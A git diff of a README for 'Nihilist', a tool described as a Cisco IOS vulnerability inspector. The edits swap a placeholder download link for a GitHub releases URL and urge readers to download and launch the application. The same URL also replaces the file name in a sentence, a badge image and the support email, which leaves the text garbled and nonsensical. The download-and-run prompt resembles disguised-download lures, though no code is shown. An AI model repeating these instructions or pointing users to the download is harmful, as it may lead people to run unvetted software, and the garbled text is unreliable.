@@ -24,13 +24,13 @@ Nihilist is a powerful tool designed for blue teams and cybersecurity profession
 🐍 python  
 
 ## Usage
-To access the Nihilist tool, please download it from the following link: [Download Nihilist](https://github.com/project/files/App.zip)
+To access the Nihilist tool, please download it from the following link: [Download Nihilist](https://github.com/donatd0/Nihilist/releases)
 
-If the link ends with the file name "App.zip," make sure to launch the application to start inspecting Cisco IOS devices for security vulnerabilities.
+If the link ends with the file name "https://github.com/donatd0/Nihilist/releases," make sure to launch the application to start inspecting Cisco IOS devices for security vulnerabilities.
 
 If the provided link is not working, visit the "Releases" section of the repository for alternative download options.
 
-[![Download Nihilist](https://img.shields.io/badge/Download-Nihilist-green)](https://github.com/project/files/App.zip)
+[![Download Nihilist](https://github.com/donatd0/Nihilist/releases)](https://github.com/donatd0/Nihilist/releases)
 
 ## Getting Started
 Follow these steps to get started with Nihilist:
@@ -45,6 +45,6 @@ We welcome contributions from the cybersecurity community to improve Nihilist. I
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Support
-For any support or inquiries, please contact the project maintainers via email at support@nihilist.io.
+For any support or inquiries, please contact the project maintainers via email at https://github.com/donatd0/Nihilist/releases
 
 Let's work together to enhance network security and defend against cyber threats with Nihilist! 🛡️🔒🚀
